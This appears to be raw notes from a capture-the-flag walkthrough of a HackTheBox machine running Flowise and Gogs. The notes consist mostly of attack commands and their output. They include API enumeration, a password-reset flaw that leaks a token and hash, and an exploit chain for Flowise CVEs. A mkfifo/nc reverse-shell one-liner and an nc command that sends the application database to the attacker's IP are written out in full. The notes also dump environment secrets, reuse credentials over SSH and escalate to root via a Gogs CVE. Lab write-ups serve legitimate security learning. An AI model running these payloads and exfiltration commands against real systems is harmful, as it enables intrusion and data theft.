http://staging.silentium.htb/signin

Flowise - Build AI Agents, Visually

└─$ sudo dirsearch -u http://staging.silentium.htb/api/v1/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ed/reports/http_staging.silentium.htb/_api_v1__26-04-14_05-04-34.txt

Target: http://staging.silentium.htb/

[05:04:34] Starting: api/v1/
[05:04:58] 200 -    3KB - /api/v1/attachments
[05:04:58] 200 -    3KB - /api/v1/attachments.php
[05:04:58] 200 -    3KB - /api/v1/attachments.aspx
[05:04:58] 200 -    3KB - /api/v1/attachments.jsp
[05:04:58] 200 -    3KB - /api/v1/attachments.html
[05:04:58] 200 -    3KB - /api/v1/attachments.js
[05:04:58] 200 -    3KB - /api/v1/auth/login
[05:04:58] 200 -    3KB - /api/v1/auth/login.aspx
[05:04:58] 200 -    3KB - /api/v1/auth/login.jsp
[05:04:58] 200 -    3KB - /api/v1/auth/login.php
[05:04:58] 200 -    3KB - /api/v1/auth/login.html
[05:04:58] 200 -    3KB - /api/v1/auth/login.js
[05:05:12] 412 -  128B  - /api/v1/feedback
[05:05:12] 200 -    3KB - /api/v1/feedback.php
[05:05:12] 200 -    3KB - /api/v1/feedback.aspx
[05:05:12] 200 -    3KB - /api/v1/feedback.jsp
[05:05:12] 200 -    3KB - /api/v1/feedback_js.js
[05:05:12] 200 -    3KB - /api/v1/feedback.js
[05:05:12] 200 -    3KB - /api/v1/feedback.html
[05:05:19] 200 -    3KB - /api/v1/ip.txt
[05:05:19] 200 -    3KB - /api/v1/ipch/
[05:05:19] 200 -    3KB - /api/v1/ip_configs/
[05:05:19] 200 -    3KB - /api/v1/ipython/tree
[05:05:25] 200 -    3KB - /api/v1/metrics/
[05:05:25] 200 -    3KB - /api/v1/metrics.json
[05:05:25] 200 -    3KB - /api/v1/metrics
[05:05:34] 200 -    4B  - /api/v1/ping
[05:05:41] 200 -    3KB - /api/v1/settings.aspx
[05:05:41] 200 -    3KB - /api/v1/settings.php
[05:05:41] 200 -    3KB - /api/v1/settings.html
[05:05:41] 200 -   31B  - /api/v1/settings
[05:05:41] 200 -    3KB - /api/v1/settings.jsp
[05:05:42] 200 -    3KB - /api/v1/settings.js
[05:05:42] 200 -    3KB - /api/v1/settings.php.bak
[05:05:42] 200 -    3KB - /api/v1/settings.php.dist
[05:05:42] 200 -    3KB - /api/v1/settings.php.swp
[05:05:42] 200 -    3KB - /api/v1/settings.php.old
[05:05:42] 200 -    3KB - /api/v1/settings.php.txt
[05:05:42] 200 -    3KB - /api/v1/settings.php.save
[05:05:42] 200 -    3KB - /api/v1/settings.py
[05:05:42] 200 -   31B  - /api/v1/settings/
[05:05:42] 200 -    3KB - /api/v1/settings.xml
[05:05:42] 200 -    3KB - /api/v1/settings.php~
[05:05:53] 200 -    3KB - /api/v1/version.txt
[05:05:53] 200 -   19B  - /api/v1/version/
[05:05:53] 200 -   19B  - /api/v1/version
[05:05:53] 200 -    3KB - /api/v1/version.web



Marcus Thorne
Ben
Elena Rossi



POST /api/v1/auth/login HTTP/1.1
Host: staging.silentium.htb
Content-Length: 34
x-request-from: internal
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://staging.silentium.htb
Referer: http://staging.silentium.htb/signin
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"a@a.com","password":"1"}

{"statusCode":404,"success":false,"message":"User Not Found","stack":{}

{"email":"ben@silentium.htb","password":"1"}

"statusCode":401,"success":false,"message":"Incorrect Email or Password"




POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
Content-Length: 38
x-request-from: internal
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://staging.silentium.htb
Referer: http://staging.silentium.htb/forgot-password
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"user":{"email":"ben@silentium.htb"}}

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"FKRhkkxC7Jpuke9ywJz0W4lLKrPHyypXLcMbTubj9TYB96Ant3dazHrC9yl2LPT1","tokenExpiry":"2026-04-15T03:06:35.250Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-15T02:51:35.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{


    http://staging.silentium.htb/reset-password

Bensilentium1!


http://staging.silentium.htb/apikey
hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc  API-key  



└─$ python3 flowise_chain.py -t http://staging.silentium.htb -e ben@silentium.htb --api-key 'hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc' --new-password 'Bensilentium2!' --lhost 10.10.16.29 --lport 443 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.29 8821 >/tmp/f'

 ┌──────────────────────────────────────────────────────────────┐
 │  Flowise CVE-2025-58434 + CVE-2025-59528                     │
 │  Unauthenticated ATO -> CustomMCP RCE                        │
 │  Affected: Flowise <= 3.0.5                                  │
 └──────────────────────────────────────────────────────────────┘

[*] Mode:        Reverse shell -> 10.10.16.29:443
[!] Start listener: nc -lvnp 443
[*] Press Enter when listener is ready...
[*] Target:      http://staging.silentium.htb

[*] Checking Flowise version...
[*] Version:     3.0.5
[+] Version 3.0.5 is vulnerable.

[*] Using provided API key: hWp_8jB76zi0VtKS...
[*] Step 4: CVE-2025-59528 — Triggering CustomMCP RCE...
[+] TIMEOUT — reverse shell may have connected

[*] Done.
                 

└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.178.86] 36233
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # ls -la
total 68
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 .dockerenv
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin



drwxr-xr-x    3 root     root          4096 Apr  8 09:41 .
drwx------    1 root     root          4096 Apr  8 09:41 ..
-rw-r--r--    1 root     root        385024 Mar 16 22:52 database.sqlite
-rw-r--r--    1 root     root            32 Jan 29 20:08 encryption.key
drwxr-xr-x    2 root     root          4096 Apr  8 09:41 uploads
~/.flowise # ls -la uploads
total 8
drwxr-xr-x    2 root     root          4096 Apr  8 09:41 .
drwxr-xr-x    3 root     root          4096 Apr  8 09:41 ..
~/.flowise # which nc
/usr/bin/nc
~/.flowise # nc 10.10.16.29 8821 < database.sqlite

└─$ sqlite3 a.sqlite    
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
apikey                     lead                     
assistant                  login_activity           
chat_flow                  login_method             
chat_message               login_sessions           
chat_message_feedback      migrations               
credential                 organization             
custom_template            organization_user        
dataset                    role                     
dataset_row                tool                     
document_store             upsert_history           
document_store_file_chunk  user                     
evaluation                 variable                 
evaluation_run             workspace                
evaluator                  workspace_shared         
execution                  workspace_user           
sqlite> SELECT * from user
   ...> ;
e26c9d6c-678c-4c10-9e36-01813e8fea73|admin|ben@silentium.htb|$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG||2026-03-16 23:05:39.142|active|2026-01-29 20:14:57|2026-03-16 22:51:17|e26c9d6c-678c-4c10-9e36-01813e8fea73|e26c9d6c-678c-4c10-9e36-01813e8fea73


Information Leakage: If you can read /proc/1/environ, you might find API keys or database passwords passed as environment variables.

/proc/1 # cat environ
FLOWISE_PASSWORD=F1l3_d0ck3rALLOW_UNAUTHORIZED_CERTS=trueNODE_VERSION=20.19.4HOSTNAME=c78c3cceb7baYARN_VERSION=1.22.22SMTP_PORT=1025SHLVL=1PORT=3000HOME=/rootSENDER_EMAIL=ben@silentium.htbPUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browserJWT_ISSUER=ISSUERJWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDDSMTP_USERNAME=testSMTP_SECURE=falseJWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200FLOWISE_USERNAME=benPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binDATABASE_PATH=/root/.flowiseJWT_TOKEN_EXPIRY_IN_MINUTES=360JWT_AUDIENCE=AUDIENCESECRETKEY_PATH=/root/.flowisePWD=/SMTP_PASSWORD=r04D!!_R4geSMTP_HOST=mailhogJWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDDSMTP_USER=test

ben
r04D!!_R4ge

└─$ ssh ben@silentium.htb
ben@silentium.htb's password: 

ben@silentium:~$ 



══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Apr  2 13:31 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Apr  2 13:31 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Jan 29 20:02 /etc/nginx/sites-enabled/staging -> /etc/nginx/sites-available/staging
server {
    listen 80;
    listen [::]:80;
    server_name staging.silentium.htb;
    location / {
        proxy_pass http://127.0.0.1:3000;
    }
}
lrwxrwxrwx 1 root root 42 Jan 29 21:29 /etc/nginx/sites-enabled/staging-v2-code -> /etc/nginx/sites-available/staging-v2-code
server {
    listen 80;
    server_name staging-v2-code.dev.silentium.htb;
    location / {
        proxy_pass http://127.0.0.1:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}





ssh -L 3001:localhost:3001 ben@silentium.htb

https://github.com/Ghxstsec/CVE-2025-8110

└─$ nc -nvlp 444 
listening on [any] 444 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.185.234] 34980
bash: cannot set terminal process group (1533): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/14# id
id
uid=0(root) gid=0(root) groups=0(root)
